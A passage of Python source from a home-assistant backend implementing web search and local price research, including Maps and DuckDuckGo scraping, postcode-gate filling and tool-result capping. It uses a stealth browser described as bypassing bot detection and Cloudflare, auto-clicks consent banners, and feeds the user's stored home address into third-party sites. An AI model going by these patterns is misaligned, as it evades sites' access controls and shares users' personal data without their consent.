# Generic international: "London, UK" / "New York, NY" / "Paris, France"
_INTL_LOCATION_RE = re.compile(
    r"\b(?P<city>[A-Z][a-zA-Z\s]{2,25}?)"
    r"\s*,\s*"
    r"(?P<region>[A-Z][a-zA-Z\s]{1,20})\b",
    re.IGNORECASE,
)

# "near me" / "nearby" / "near here" — location should come from MemPalace
_NEAR_ME_RE = re.compile(
    r"\b(near\s+me|nearby|near\s+here|in\s+my\s+area|around\s+me|locally|local)\b",
    re.IGNORECASE,
)

_POSTCODE_RE = re.compile(r"\b([0-9]{4,5})\b")


def _parse_ddg_result_urls(html: str, max_results: int = 6) -> list[str]:
    """Extract real destination URLs from DuckDuckGo HTML search results."""
    import re as _re
    from urllib.parse import unquote as _uq

    urls: list[str] = []
    # DDG wraps links in uddg= redirect params
    for m in _re.finditer(r'uddg=([^"&\s]+)', html):
        url = _uq(m.group(1))
        if url.startswith("http") and "y.js" not in url and url not in urls:
            urls.append(url)
            if len(urls) >= max_results:
                break
    # Fallback: bare href on result links
    if not urls:
        for m in _re.finditer(r'class="result__a"[^>]+href="([^"]+)"', html):
            url = m.group(1)
            if url.startswith("http") and url not in urls:
                urls.append(url)
                if len(urls) >= max_results:
                    break
    return urls


async def _resolve_user_location(query: str, user_id: str = "") -> dict:
    """Determine city + state/region + postcode from query text and/or MemPalace facts.

    Handles AU locations, international "City, Country" format, and "near me" phrasing.
    Returns a dict with keys: city, state, postcode (any may be empty string).
    """
    city = state = postcode = ""

    # 1. "near me" / "nearby" — skip regex matching; rely on MemPalace below
    near_me = bool(_NEAR_ME_RE.search(query))

    if not near_me:
        # 2a. Try AU-specific match first (most common for this deployment)
        m = _AU_LOCATION_RE.search(query)
        if m:
            city = m.group("city").strip()
            state = m.group("state").strip()
        else:
            # 2b. Try generic international "City, Region/Country" match
            m2 = _INTL_LOCATION_RE.search(query)
            if m2:
                city = m2.group("city").strip()
                state = m2.group("region").strip()

    # 3. Extract postcode from the query (AU 4-digit or US/UK 5-digit)
    pc = _POSTCODE_RE.search(query)
    if pc:
        postcode = pc.group(1)

    # 4. If still missing city or postcode (or "near me"), consult MemPalace
    if user_id and (not city or not postcode or near_me):
        try:
            facts = await _mempalace_search(
                "home address location suburb postcode city", user_id=user_id, limit=4
            )
            for fact in facts:
                text = fact.get("summary", "") if isinstance(fact, dict) else str(fact)
                if not city:
                    mf = _AU_LOCATION_RE.search(text) or _INTL_LOCATION_RE.search(text)
                    if mf:
                        city = mf.group("city").strip()
                        state = mf.group("region" if "region" in mf.groupdict() else "state").strip()
                if not postcode:
                    pcf = _POSTCODE_RE.search(text)
                    if pcf:
                        postcode = pcf.group(1)
        except Exception:
            pass

    logger.info("_resolve_user_location: city=%r state=%r postcode=%r near_me=%s",
                city, state, postcode, near_me)
    return {"city": city, "state": state, "postcode": postcode}


async def _google_maps_local_search(
    category: str,
    location_str: str,
    ctx,
    max_results: int = 8,
) -> list[dict]:
    """Discover local businesses via Google Maps.

    Returns a list of {name, address, website, phone} dicts for businesses
    matching `category` near `location_str`. Uses CloakBrowser so Google's
    JS-rendered results fully load. Much more complete than a DDG keyword
    search — finds every listed business regardless of their web SEO.
    """
    import re as _re
    from urllib.parse import quote_plus as _qp, unquote as _uq

    search_url = f"https://www.google.com/maps/search/{_qp(category + ' near ' + location_str)}"
    page = None
    businesses: list[dict] = []

    try:
        page = await ctx.new_page()
        await page.goto(search_url, wait_until="domcontentloaded", timeout=20000)
        # Let the JS results panel render
        await page.wait_for_timeout(3500)

        # Scroll the results sidebar to load more listings
        try:
            await page.evaluate(
                "document.querySelector('[role=feed]')?.scrollBy(0, 1500)"
            )
            await page.wait_for_timeout(1500)
        except Exception:
            pass

        html = await page.content()

        # Domains belonging to Google infrastructure — never a business website
        _GOOGLE_DOMAINS = {
            "google.com", "google.com.au", "googleapis.com", "gstatic.com",
            "googleusercontent.com", "googlevideo.com", "accounts.google.com",
            "support.google.com", "maps.google.com",
        }

        def _is_business_url(url: str) -> bool:
            domain = _re.sub(r"^https?://(?:www\.)?", "", url).split("/")[0].lower()
            # Reject any URL whose domain is or ends with a Google domain
            for gd in _GOOGLE_DOMAINS:
                if domain == gd or domain.endswith("." + gd):
                    return False
            # Must look like a real domain (has a dot, not empty, not a path fragment)
            return bool(domain) and "." in domain and len(domain) > 4

        # ── Extract website URLs from Maps result cards ────────────────────────
        seen_domains: set[str] = set()
        website_re = _re.compile(r'href="(https?://[^"]+)"', _re.I)
        for m in website_re.finditer(html):
            url = m.group(1)
            if not _is_business_url(url):
                continue
            domain = _re.sub(r"^https?://(?:www\.)?", "", url).split("/")[0].lower()
            if domain and domain not in seen_domains:
                seen_domains.add(domain)
                businesses.append({"website": url, "name": domain})
            if len(businesses) >= max_results:
                break

        # ── Also try to extract structured name+address from aria labels ───────
        name_re = _re.compile(r'aria-label="([^"]{3,80})"')
        names = [m.group(1) for m in name_re.finditer(html)
                 if not m.group(1).startswith(("Google", "Search", "Map", "Zoom", "Collapse",
                                                "Menu", "Close", "Back", "Forward", "More"))]
        for i, biz in enumerate(businesses):
            if i < len(names):
                biz["name"] = names[i]

        # ── Fallback: generic DDG local-business search when Maps fails ────────
        # Google Maps consistently serves a no-JS fallback to headless browsers.
        # Fall back to two generic DDG queries that work for ANY product/category:
        #   1. "{category} {location}" — finds stores that specifically mention the product
        #   2. "{category} buy near {location}" — surfaces retailers/service providers
        # No hardcoded store types, directories, or postcodes.
        if len(businesses) < 2:
            logger.info("_google_maps_local_search: Maps gave no results, trying DDG local-business fallback")
            _fallback_queries = [
                f"{category} {location_str}",
                f"{category} buy near {location_str}",
            ]
            for fq in _fallback_queries:
                if len(businesses) >= max_results:
                    break
                try:
                    fb_page = await ctx.new_page()
                    try:
                        await fb_page.goto(
                            f"https://html.duckduckgo.com/html/?q={_qp(fq)}",
                            wait_until="domcontentloaded",
                            timeout=12000,
                        )
                        fb_html = await fb_page.content()
                    finally:
                        await fb_page.close()

                    for m2 in _re.finditer(r'uddg=([^"&\s]+)', fb_html):
                        url2 = _uq(m2.group(1))
                        if "duckduckgo.com" in url2 or "y.js" in url2:
                            continue
                        if not _is_business_url(url2):
                            continue
                        domain2 = _re.sub(r"^https?://(?:www\.)?", "", url2).split("/")[0].lower()
                        if domain2 not in seen_domains:
                            seen_domains.add(domain2)
                            businesses.append({"website": url2, "name": domain2})
                        if len(businesses) >= max_results:
                            break
                except Exception as _fb:
                    logger.debug("_google_maps_local_search DDG fallback error %r: %s", fq, _fb)

        logger.info(
            "_google_maps_local_search: found %d businesses for %r near %r",
            len(businesses), category, location_str,
        )
    except Exception as e:
        logger.warning("_google_maps_local_search error: %s", e)
    finally:
        if page:
            try:
                await page.close()
            except Exception:
                pass

    return businesses


async def _search_within_site(page, product_query: str) -> bool:
    """Try to use a website's own search box to find a specific product.

    Attempts common search input selectors, fills the product query, submits,
    and waits for results. Returns True if a search was performed.
    """
    _SEARCH_SELECTORS = [
        'input[type="search"]',
        'input[placeholder*="search" i]',
        'input[placeholder*="find" i]',
        'input[aria-label*="search" i]',
        'input[name="q"]',
        'input[name="s"]',
        'input[name="search"]',
        'input[name="query"]',
        '[role="search"] input',
        '.search-input',
        '#search-input',
        '#searchInput',
    ]
    for sel in _SEARCH_SELECTORS:
        try:
            el = await page.query_selector(sel)
            if el:
                await el.fill(product_query)
                await el.press("Enter")
                try:
                    await page.wait_for_load_state("networkidle", timeout=6000)
                except Exception:
                    await page.wait_for_timeout(2500)
                logger.info("_search_within_site: searched for %r using %s", product_query[:40], sel)
                return True
        except Exception:
            continue
    return False


async def _web_research(query: str, user_id: str = "") -> str:
    """General-purpose web research framework.

    Works for any query — news, prices, local businesses, facts, comparisons.
    Strategy is inferred from the query itself at runtime; nothing is hardcoded
    per topic or domain.

    Pipeline:
    1. Classify the query → determines search depth (pages to visit)
    2. Resolve location context from query text and/or MemPalace user facts
    3. CloakBrowser search (stealth Chromium, reliable for all content types)
    4. Optionally run a secondary "find local sources" search when location present
    5. Visit pages up to the depth limit; auto-fill any location/postcode gate
    6. Return extracted text so the LLM can synthesise the final answer
    """
    try:
        from cloakbrowser import launch_context_async  # type: ignore[import]
    except ImportError:
        return ""

    from urllib.parse import quote_plus as _qp  # noqa: PLC0415

    # ── 1. Classify query depth ────────────────────────────────────────────────
    # DEEP wins over QUICK — "what is the best restaurant near me" must get max_pages=5
    _DEEP_RE = re.compile(
        r"\b(?:"
        # Prices & shopping
        r"price|prices|cost|cheap|cheapest|buy|purchase|compare|comparison|how\s+much|deal|deals|"
        r"in\s+stock|available|stock|"
        # Local business discovery
        r"near\s+(?:me|here|us)|nearby|local|closest|nearest|"
        r"find\s+(?:a|all|me\b)|where\s+can\s+I|where\s+to\s+(?:buy|get|find)|"
        r"stores?|shops?|outlets?|"
        # Services
        r"plumber|electrician|mechanic|dentist|doctor|pharmacy|vet|lawyer|"
        r"tradesman|tradie|contractor|cleaner|handyman|"
        # Food & hospitality
        r"restaurant|cafe|coffee|pizza|takeaway|delivery|pub|bar|"
        r"open\s+now|opening\s+hours|hours|closed|"
        # Events & activities
        r"events?|what.?s\s+on|happening|tonight|this\s+weekend|concert|show|"
        r"movie|cinema|festival|market|markets|gig|"
        # Accommodation & transport
        r"hotel|motel|airbnb|accommodation|stay|"
        r"flight|flights|bus|train|timetable|schedule|"
        # Employment
        r"job|jobs|work|hiring|vacancy|vacancies|"
        # Reviews & ratings
        r"review|reviews|rating|best|worst|recommended|"
        # Real estate
        r"rent|house|property|real\s+estate|for\s+sale|"
        # Contact & location info
        r"phone\s+number|address|directions|all\s+(?:the\s+)?(?:options|stores|shops|places)"
        r")\b",
        re.IGNORECASE,
    )
    # Signals that a single result is probably enough — checked AFTER DEEP
    _QUICK_RE = re.compile(
        r"\b(?:define|definition|what\s+is\s+a?\s*\w+|who\s+is|when\s+(?:did|was|is)|"
        r"how\s+(?:do\s+you|to)\s|capital\s+of|population\s+of)\b",
        re.IGNORECASE,
    )
    if _DEEP_RE.search(query):
        max_pages = 5
    elif _QUICK_RE.search(query):
        max_pages = 1
    else:
        max_pages = 3

    # ── 2. Resolve location context ────────────────────────────────────────────
    loc = await _resolve_user_location(query, user_id)
    city    = loc.get("city", "")
    state   = loc.get("state", "")
    postcode = loc.get("postcode", "")
    location_str = " ".join(filter(None, [city, state]))

    # Common selectors for location/postcode gates on AU (and general) retail sites
    _LOCATION_SELECTORS = [
        'input[placeholder*="postcode" i]',
        'input[placeholder*="suburb" i]',
        'input[placeholder*="location" i]',
        'input[placeholder*="zip" i]',
        'input[aria-label*="postcode" i]',
        'input[aria-label*="suburb" i]',
        'input[aria-label*="location" i]',
        'input[name="postcode"]',
        'input[name="suburb"]',
        'input[name="location"]',
        'input[id*="postcode" i]',
        '#postcode',
        '.location-input input',
    ]

    # ── 3. Build the product query keywords (stop-word filtered) ─────────────
    _STOP = {
        "cheapest", "cheap", "best", "find", "search", "get", "buy", "the",
        "a", "an", "in", "at", "near", "for", "of", "and", "or", "price",
        "prices", "cost", "how", "much", "what", "where", "please", "can",
        "could", "would", "i", "me", "my", "want", "need", "looking",
        # AU state names and abbreviations
        "western", "australia", "wa", "nsw", "vic", "qld", "sa", "tas", "nt", "act",
        # International location terms
        "uk", "us", "usa", "eu", "nz", "england", "scotland", "ireland", "wales",
        "ny", "nyc", "ca", "la", "dc", "ontario", "alberta", "bc",
        # Generic glue words
        "store", "stores", "shop", "shops", "nearby", "around", "local",
        "area", "region", "city", "town", "suburb",
        # Container/quantity terms (product-agnostic)
        "blocks", "block", "cans", "can", "pack", "slab",
    }
    _loc_words = {w.lower() for w in re.split(r"\s+", location_str) if w}
    _product_words = [
        w for w in re.split(r"[\s,.\-?!]+", query.lower())
        if w and w not in _STOP and w not in _loc_words and not _AU_LOCATION_RE.search(w)
    ][:4]
    product_kw = " ".join(_product_words)  # e.g. "emu export beer"

    # ── 4. Collect candidate URLs from multiple discovery sources ─────────────
    ctx = await launch_context_async(headless=True)
    all_urls: list[str] = []

    _SKIP_DOMAINS = {"facebook.com", "twitter.com", "instagram.com", "youtube.com",
                     "reddit.com", "tiktok.com", "pinterest.com", "linkedin.com"}

    def _add_urls(html: str, max_results: int = 8) -> None:
        for u in _parse_ddg_result_urls(html, max_results=max_results):
            domain = re.sub(r"^https?://(?:www\.)?", "", u).split("/")[0].lower()
            if domain in _SKIP_DOMAINS or any(domain.endswith("." + d) for d in _SKIP_DOMAINS):
                continue
            if u not in all_urls:
                all_urls.append(u)

    try:
        # Source A1: primary query — already contains location, finds national chains + local stores
        # max_results=8 so local independents at positions 5-8 aren't cut off.
        ddg_page = await ctx.new_page()
        try:
            await ddg_page.goto(
                f"https://html.duckduckgo.com/html/?q={_qp(query)}",
                wait_until="domcontentloaded",
                timeout=20000,
            )
            _add_urls(await ddg_page.content(), max_results=8)
        finally:
            await ddg_page.close()

        # Source A2: bare product+city search — anchors local stores that might
        # rank lower in the full query. Runs concurrently with Maps (below) to
        # avoid adding sequential latency.
        if location_str and product_kw:
            ddg_page2 = await ctx.new_page()
            try:
                await ddg_page2.goto(
                    f"https://html.duckduckgo.com/html/?q={_qp(product_kw + ' ' + location_str)}",
                    wait_until="domcontentloaded",
                    timeout=20000,
                )
                _add_urls(await ddg_page2.content(), max_results=6)
            finally:
                await ddg_page2.close()

        # Source B: Google Maps local search — finds ALL local businesses for the
        # category near this location, regardless of their product-page SEO.
        # This is what catches Con's Liquor, Bottlemart, etc.
        # Maps URLs go FIRST so local independents aren't displaced by national-chain
        # DDG results (Liquorland, BWS) which are Cloudflare-protected JS SPAs.
        maps_urls: list[str] = []
        if location_str and _DEEP_RE.search(query) and product_kw:
            maps_businesses = await _google_maps_local_search(
                product_kw, location_str, ctx, max_results=6
            )
            for biz in maps_businesses:
                url = biz.get("website", "")
                name = biz.get("name", "")
                if url and url not in all_urls:
                    maps_urls.append(url)
                    logger.info("web_research: Maps business: %s → %s", name, url)
            logger.info(
                "web_research: Google Maps added %d local business URLs", len(maps_urls)
            )

        # Merge: Maps URLs first (local independents, more likely static HTML),
        # then DDG results (national chains). This ensures Con's Liquor gets
        # visited before Liquorland/BWS which are Cloudflare JS SPAs.
        ordered_urls: list[str] = []
        for u in maps_urls:
            if u not in ordered_urls:
                ordered_urls.append(u)
        for u in all_urls:
            if u not in ordered_urls:
                ordered_urls.append(u)

        target_urls = ordered_urls[:max_pages]
        logger.info(
            "web_research: visiting %d URLs (max_pages=%d)", len(target_urls), max_pages
        )

        # ── 5. Visit pages — with postcode fill AND site-internal search ───────
        # For each URL: fill any location gate, then if we landed on a site
        # homepage (no product in URL path), use the site's own search box
        # to navigate to the right product page before extracting content.

        async def _dismiss_overlays(page) -> None:
            """Dismiss cookie banners and consent dialogs that block interaction."""
            _dismiss_texts = ["accept", "accept all", "ok", "got it", "agree",
                              "close", "dismiss", "continue", "i agree", "allow"]
            try:
                buttons = await page.query_selector_all("button, a[role='button']")
                for btn in buttons[:20]:
                    try:
                        label = (await btn.inner_text()).strip().lower()
                        if label in _dismiss_texts:
                            await btn.click()
                            await page.wait_for_timeout(800)
                            break
                    except Exception:
                        continue
            except Exception:
                pass

        async def _page_text(page) -> str:
            """Extract visible text from the current page state."""
            html = await page.content()
            text = re.sub(r"<(script|style)[^>]*>.*?</\1>", " ", html, flags=re.S | re.I)
            text = re.sub(r"<[^>]+>", " ", text)
            text = re.sub(r"[ \t]{2,}", " ", text)
            text = re.sub(r"\n{3,}", "\n\n", text).strip()
            return text[:2500]

        async def _visit_with_search(url: str) -> str:
            """Visit url, dismiss overlays, fill location gate with full store-selection
            flow (postcode → dropdown → confirm), search within site if on a homepage."""
            page = None
            try:
                # SSRF guard: only follow result links that resolve to public
                # addresses — never loopback / LAN / cloud-metadata targets.
                if not is_public_url(url):
                    logger.warning("web_research: blocked non-public URL %s", url[:80])
                    return ""
                page = await ctx.new_page()
                # Validate EVERY request/redirect hop pre-connect: a public URL may
                # 30x to an internal/metadata host. The route guard aborts before
                # the browser connects (so page.goto raises -> handled below).
                await guard_browser_page(page)
                await page.goto(url, wait_until="domcontentloaded", timeout=12000)
                # Let JS settle before any interaction
                await page.wait_for_timeout(800)
                await _dismiss_overlays(page)

                fill_value = postcode or city
                if fill_value:
                    # ── Step A: open a hidden store-selector if one exists ───
                    # Some sites (e.g. BWS) hide the postcode input behind a
                    # trigger button. Look for it BEFORE checking input fields.
                    _OPEN_TEXTS = ["postcode", "suburb", "enter location",
                                   "find store", "select store", "change store",
                                   "my store", "set store", "your store"]
                    try:
                        for btn in await page.query_selector_all("button"):
                            label = (await btn.inner_text()).strip().lower()
                            if any(t in label for t in _OPEN_TEXTS):
                                await btn.click()
                                await page.wait_for_timeout(1200)
                                logger.info(
                                    "web_research: opened store selector via button %r on %s",
                                    label[:30], url[:60],
                                )
                                break
                    except Exception:
                        pass

                    for sel in _LOCATION_SELECTORS:
                        try:
                            el = await page.query_selector(sel)
                            if not el:
                                continue
                            visible = await el.is_visible()
                            if not visible:
                                continue
                            logger.info(
                                "web_research: filling location gate (%s) on %s",
                                sel, url[:60],
                            )
                            # Use type() so JS frameworks (Angular, React) get
                            # keystroke events and trigger their change detection.
                            await el.click()
                            await el.type(fill_value, delay=50)
                            await page.wait_for_timeout(1500)

                            # ── Step B: click first suggestion in dropdown ───
                            # Try framework-specific and generic suggestion selectors.
                            # AngularJS ng-repeat, ARIA listbox, generic li items.
                            _DROPDOWN_SELS = [
                                '[ng-repeat]:not([style*="display: none"])',   # AngularJS
                                '[role="option"]',
                                'ul[role="listbox"] li',
                                '[role="listbox"] [role="option"]',
                                '.autocomplete-suggestions li',
                                '.suggestions li',
                                '.pac-item',              # Google Places
                                '[data-testid*="suggestion"]',
                                '[class*="suggestion"]:not(input)',
                                '[class*="autocomplete-item"]',
                                '[class*="dropdown"] li',
                            ]
                            clicked_dropdown = False
                            for drop_sel in _DROPDOWN_SELS:
                                try:
                                    candidates = await page.query_selector_all(drop_sel)
                                    for cand in candidates[:5]:
                                        t = (await cand.inner_text()).strip()
                                        # Skip empty / navigation items
                                        if not t or len(t) < 3 or t.lower() in (
                                            "skip to content", "skip to trolley",
                                            "accessibility settings",
                                        ):
                                            continue
                                        await cand.click()
                                        clicked_dropdown = True
                                        logger.info(
                                            "web_research: clicked store suggestion %r (%s) on %s",
                                            t[:40], drop_sel, url[:60],
                                        )
                                        await page.wait_for_timeout(1800)
                                        break
                                    if clicked_dropdown:
                                        break
                                except Exception:
                                    continue

                            if not clicked_dropdown:
                                await el.press("Enter")

                            # ── Step B2: second-level store list ─────────────
                            # Some sites (BWS, Liquorland) show suburb → store
                            # list → confirm. After clicking the suburb suggestion,
                            # check if a new store-list appeared and pick the first.
                            if clicked_dropdown:
                                await page.wait_for_timeout(1500)
                                for drop_sel2 in _DROPDOWN_SELS:
                                    try:
                                        candidates2 = await page.query_selector_all(drop_sel2)
                                        for cand2 in candidates2[:8]:
                                            t2 = (await cand2.inner_text()).strip()
                                            if (not t2 or len(t2) < 3 or
                                                    t2.lower() in ("skip to content",
                                                                   "skip to trolley",
                                                                   "accessibility settings")):
                                                continue
                                            # Don't re-click the same item we just clicked
                                            if t2 == (await candidates2[0].inner_text()).strip() and len(candidates2) == 1:
                                                break
                                            await cand2.click()
                                            logger.info(
                                                "web_research: clicked store list item %r on %s",
                                                t2[:40], url[:60],
                                            )
                                            await page.wait_for_timeout(1500)
                                            break
                                        else:
                                            continue
                                        break
                                    except Exception:
                                        continue

                            # ── Step C: confirm/set-store button ────────────
                            _CONFIRM_TEXTS = ["yes", "confirm", "set store",
                                              "use this store", "select store",
                                              "shop here", "set location",
                                              "change store", "apply"]
                            try:
                                for btn in await page.query_selector_all("button"):
                                    label = (await btn.inner_text()).strip().lower()
                                    if any(t in label for t in _CONFIRM_TEXTS):
                                        await btn.click()
                                        logger.info(
                                            "web_research: clicked confirm %r on %s",
                                            label[:30], url[:60],
                                        )
                                        await page.wait_for_timeout(1800)
                                        break
                            except Exception:
                                pass

                            # Wait for prices to load after store selection
                            try:
                                await page.wait_for_load_state("networkidle", timeout=5000)
                            except Exception:
                                await page.wait_for_timeout(2000)
                            break
                        except Exception:
                            continue

                # If this looks like a homepage / category page (not a direct
                # product URL), try the site's own search to find the product.
                _path = re.sub(r"https?://[^/]+", "", url).strip("/")
                _is_homepage = len(_path.split("/")) <= 1
                if _is_homepage and product_kw:
                    searched = await _search_within_site(page, product_kw)
                    if searched:
                        logger.info(
                            "web_research: performed site search for %r on %s",
                            product_kw[:40], url[:60],
                        )
                        # Wait for search results to render
                        try:
                            await page.wait_for_load_state("networkidle", timeout=6000)
                        except Exception:
                            await page.wait_for_timeout(2500)

                return await _page_text(page)
            except Exception as e:
                logger.debug("web_research visit error %s: %s", url, e)
                return ""
            finally:
                if page:
                    try:
                        await page.close()
                    except Exception:
                        pass

        # Limit concurrent browser tabs — Jetson Orin NX has ~8GB free after the LLM.
        # Default 5: Maps results are lightweight store websites, not SPAs.
        # Reduce via ZOE_MAX_BROWSER_TABS env var if memory pressure is observed.
        _max_tabs = int(os.environ.get("ZOE_MAX_BROWSER_TABS", "5"))
        target_urls = target_urls[:_max_tabs]
        page_tasks = [_visit_with_search(url) for url in target_urls]
        raw_contents = await asyncio.gather(*page_tasks, return_exceptions=True)

        findings: list[str] = []
        for url, content in zip(target_urls, raw_contents):
            if isinstance(content, Exception) or not content:
                continue
            findings.append(f"[{url}]\n{content}")

    finally:
        try:
            await ctx.close()
        except Exception:
            pass

    if not findings:
        return ""

    header = (
        f"Web research results for '{query}'"
        + (f" (location: {location_str}{' ' + postcode if postcode else ''})" if location_str else "")
        + "\n\nIMPORTANT: Each section below is labelled [SOURCE URL]. "
        "When reporting prices, ALWAYS state the exact store name from the URL, "
        "NOT a guess. Do NOT attribute a price to a store unless that store's URL "
        "is the section header for that price."
    )
    return header + "\n\n" + "\n\n---\n\n".join(findings)


# _agentic_local_price_search removed — superseded by _web_research


async def _cloak_search(query: str, max_results: int = 5, timeout_ms: int = 20000) -> list[dict]:
    """CloakBrowser stealth search — async fallback when ddgs is blocked or empty.

    Uses stealth Chromium (57 C++ source patches) to bypass bot detection. Slower than
    ddgs (~5s vs ~3s) but succeeds where the API is rate-limited or Cloudflare-protected.

    DDG HTML wraps result URLs in uddg= redirect params and sometimes serves ads first;
    this function decodes the real URLs and skips ad results.
    """
    import re as _re
    from urllib.parse import quote_plus as _qp, unquote as _uq
    from cloakbrowser import launch_context_async  # type: ignore[import]

    # Match organic result blocks: <h2 class="result__title">…<a class="result__a" href="…">title</a>
    # followed by a snippet element.
    _RESULT_RE = _re.compile(
        r'<h2\s+class="result__title">'
        r'.*?<a[^>]+class="result__a"[^>]+href="(?P<href>[^"]+)"[^>]*>(?P<title>[^<]+)</a>'
        r'.*?class="result__snippet"[^>]*>(?P<snippet>[^<]{10,400})',
        _re.S,
    )

    search_url = f"https://html.duckduckgo.com/html/?q={_qp(query)}"
    ctx = await launch_context_async(headless=True)
    try:
        page = await ctx.new_page()
        await page.goto(search_url, wait_until="domcontentloaded", timeout=timeout_ms)
        html = await page.content()
    finally:
        await ctx.close()

    results: list[dict] = []
    for m in _RESULT_RE.finditer(html):
        if len(results) >= max_results:
            break
        raw_href = m.group("href")
        # Decode DDG uddg= redirect to get the actual target URL
        uddg = _re.search(r"uddg=([^&\"]+)", raw_href)
        href = _uq(uddg.group(1)) if uddg else raw_href
        # Skip ads (DDG ad redirects go through y.js)
        if "y.js" in href or "ad_domain" in href or not href.startswith("http"):
            continue
        title   = _re.sub(r"<[^>]+>", "", m.group("title")).strip()
        snippet = _re.sub(r"<[^>]+>", "", m.group("snippet")).strip()
        if title and snippet:
            results.append({"title": title, "body": snippet, "href": href})
    return results


async def _web_search_ddg(query: str, user_id: str = "") -> str:
    """Fast web search backing the web_search tool.

    Intentionally lightweight — ddgs primary (~2-3s), CloakBrowser stealth
    as fallback only when ddgs returns zero results. No multi-step research,
    no Google Maps, no site-internal search. `user_id` is accepted for API
    consistency but is not used (location not needed for fast lookups).

    For local business discovery, multi-store price comparison, or any task
    requiring multiple site visits, use _web_research (backing deep_web_research).
    """
    import asyncio as _asyncio
    import importlib.util as _ilu

    def _fmt(results: list[dict]) -> str:
        lines = [f"Web search results for '{query}':"]
        for r in results:
            title   = r.get("title") or r.get("name", "")
            snippet = r.get("body")  or r.get("value", "")
            url     = r.get("href")  or r.get("url", "")
            lines.append(f"- {title}: {snippet}" + (f" ({url})" if url else ""))
        return "\n".join(lines)

    # Primary: ddgs API — fast, no browser needed
    try:
        loop = _asyncio.get_event_loop()
        results = await loop.run_in_executor(
            None, lambda: _ddg_search_sync(query, max_results=6, timeout_s=10.0)
        )
        if results:
            return _fmt(results)
    except Exception as exc:
        logger.info("web_search: ddgs failed (%s) — trying CloakBrowser", exc)

    # Fallback: CloakBrowser when ddgs is blocked or returns nothing
    _has_cloak = _ilu.find_spec("cloakbrowser") is not None
    if _has_cloak:
        try:
            cloak_results = await _cloak_search(query)
            if cloak_results:
                return _fmt(cloak_results)
        except Exception as exc:
            logger.warning("web_search: CloakBrowser also failed: %s", exc)

    return f"No web results found for: {query}"


# ── Tool output caps ──────────────────────────────────────────────────────────
# Applied at both messages.append sites so the LLM context never blows past
# ZOE_CONTEXT_TOKEN_BUDGET on a single noisy tool result.
# Per-tool limits are tunable via env vars; defaults chosen to fit comfortably
# inside a 5500-token budget alongside history, system prompt, and user message.

_TOOL_CAPS: dict[str, int] = {
    # ambient_search: JSON {"results":[...], "count":N} — trim rows + truncate
    # transcripts before re-serializing so the model still gets valid JSON
    "ambient_search":      int(os.environ.get("ZOE_CAP_AMBIENT_SEARCH",   "0")),   # handled specially
    # deep_web_research: {"query":..., "raw":<big string>}
    "deep_web_research":   int(os.environ.get("ZOE_CAP_WEB_RESEARCH",    "6000")),
    # memory_list: {"items":[...], "count":N, "status":...}
    "memory_list":         int(os.environ.get("ZOE_CAP_MEMORY_LIST",      "0")),   # handled specially
    # a2a_delegate: arbitrary peer JSON
    "a2a_delegate":        int(os.environ.get("ZOE_CAP_A2A_DELEGATE",    "3000")),
    # zoe_self_capabilities: service/widget/page/skill lists
    "zoe_self_capabilities": int(os.environ.get("ZOE_CAP_SELF_CAPS",     "2000")),
}

_AMBIENT_MAX_ROWS     = int(os.environ.get("ZOE_CAP_AMBIENT_ROWS",        "10"))
_AMBIENT_TRANSCRIPT   = int(os.environ.get("ZOE_CAP_AMBIENT_TRANSCRIPT", "150"))
_MEMORY_LIST_MAX_ROWS = int(os.environ.get("ZOE_CAP_MEMORY_LIST_ROWS",    "25"))


def _cap_tool_result(tool_name: str, result: str) -> str:
    """Cap noisy MCP tool results before they enter the LLM context window.

    Tools like ambient_search and deep_web_research can return 10k-15k chars
    in a single call, silently overwhelming ZOE_CONTEXT_TOKEN_BUDGET.
    We apply per-tool limits here — at the single point where results enter
    messages[] — rather than at the MCP layer, so OpenClaw and the intent
    fast-path are unaffected.
    """
    if tool_name == "ambient_search":
        try:
            data = json.loads(result)
            rows = data.get("results") or []
            if len(rows) > _AMBIENT_MAX_ROWS or any(
                len(r.get("transcript") or "") > _AMBIENT_TRANSCRIPT for r in rows
            ):
                trimmed = []
                for r in rows[:_AMBIENT_MAX_ROWS]:
                    entry = dict(r)
                    if len(entry.get("transcript") or "") > _AMBIENT_TRANSCRIPT:
                        entry["transcript"] = (entry["transcript"] or "")[:_AMBIENT_TRANSCRIPT] + "…"
                    trimmed.append(entry)
                data["results"] = trimmed
                data["count"] = len(trimmed)
                data["_capped"] = True
                return json.dumps(data)
        except Exception:
            pass
        # Fallback: plain string cap
        cap = _AMBIENT_MAX_ROWS * (_AMBIENT_TRANSCRIPT + 60)
        return result[:cap] + ("…" if len(result) > cap else "")

    if tool_name == "memory_list":
        try:
            data = json.loads(result)
            items = data.get("items") or []
            if len(items) > _MEMORY_LIST_MAX_ROWS:
                data["items"] = items[:_MEMORY_LIST_MAX_ROWS]
                data["count"] = len(data["items"])
                data["_capped"] = True
                return json.dumps(data)
        except Exception:
            pass
        return result

    cap = _TOOL_CAPS.get(tool_name, 0)
    if cap and len(result) > cap:
        return result[:cap] + "…"
    return result


# ── Tool dispatch ─────────────────────────────────────────────────────────────

def _zoe_base_url() -> str:
    return str(os.environ.get("ZOE_CHAT_URL", "http://localhost:8000")).rstrip("/")


async def _dispatch_tool(tool_name: str, args: dict, user_id: str = "guest") -> str:
    """Dispatch a tool call and return result as string."""
    if tool_name in {
        "calendar_today",
        "calendar_list_events",
        "calendar_create_event",
        "reminder_create",
        "reminder_list",
        "list_add_item",
        "list_get_items",
        "weather_current",
        "weather_forecast",
        "panel_navigate",
    }:
        try:
            from mcp_server import handle_tool as _mcp_handle_tool
            mcp_args = dict(args or {})
            # Keep MCP tools user-scoped where available.
            mcp_args.setdefault("_user_id", user_id)
            return await _mcp_handle_tool(tool_name, mcp_args)
        except Exception as exc:
            return json.dumps({"error": f"mcp_tool_failed:{tool_name}:{exc}"})

    if tool_name == "open_touch_page":
        page = str((args or {}).get("page", "")).strip().lower()
        panel_id = str((args or {}).get("panel_id") or os.environ.get("ZOE_PANEL_ID", "zoe-touch-pi")).strip()
        base_url = _zoe_base_url()
        # Estate (home.html) is the sole kiosk surface: navigate there with a
        # ?domain= hint and let the estate open the matching screen (its
        # DOMAIN_SCREEN map), mirroring the voice/chat panel-nav paths.
        page_map = {
            "weather": f"{base_url}/touch/home.html?domain=weather",
            "calendar": f"{base_url}/touch/home.html?domain=calendar",
            "reminders": f"{base_url}/touch/home.html?domain=reminders",
            "lists": f"{base_url}/touch/home.html?domain=lists",
        }
        url = page_map.get(page)
        if not url:
            return json.dumps({"error": f"unknown_page:{page}"})
        try:
            from mcp_server import handle_tool as _mcp_handle_tool
            return await _mcp_handle_tool(
